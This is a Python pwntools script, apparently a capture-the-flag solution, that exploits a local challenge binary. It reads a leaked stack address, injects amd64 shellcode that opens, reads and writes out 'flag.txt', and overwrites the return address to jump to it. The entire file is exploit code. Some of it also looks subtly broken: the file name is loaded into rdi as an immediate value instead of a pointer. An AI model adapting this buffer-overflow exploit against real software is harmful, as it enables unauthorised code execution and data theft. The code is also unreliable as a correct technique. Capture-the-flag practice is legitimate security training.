import pwn
from pwnlib.util.packing import p64
from itertools import zip_longest


def grouper(iterable, n=4, FillValue=None):
    """
    Recipe taken from stdlibrary docs
    """
    args = [iter(iterable)] * n
    return zip_longest(*args, fillvalue=FillValue)


PWNSIZE = 64 // 4
p = pwn.process("./chall")
print(str(p.recvline(), "ascii"))
p.sendline(bytes(str(PWNSIZE), "ascii"))
payload = bytearray()
address = int(p.recvline().partition(b": ")[-1].strip().decode("ascii"), 16)
print(str(p.recvline(), "ascii", "ignore"))

pwn.context.clear(arch="amd64")
FLAG_STRING = "flag.txt"
payload += pwn.asm("""
        xor rax, rax
        inc rax
        inc rax
        mov rdi, 0x{0}
        """.format(FLAG_STRING.encode("ascii").hex()))
payload += pwn.asm("""
        xor rsi, rsi
        xor rdx, rdx
        syscall
        push rax
        xor rax, rax
        pop rdi
        """)
payload += pwn.asm("""
        mov rsi, """ + hex(address))
payload += pwn.asm("""
        mov rdx, {0}
        syscall
        xor rax, rax
        inc rax
        syscall
        """.format(hex((19 * 4) - 1)))
assert (len(payload) < 18 * 4), "payload is too long already"
payload += b"1" * ((19 * 4) + 4 - len(payload))
payload += p64(address)
print(str(payload, "ascii", "ignore"))
for x in map(str,
         (int.from_bytes(y, "little", signed=False)
          for y in
          grouper(payload))):
    p.sendline(x)

print(p.recvline())
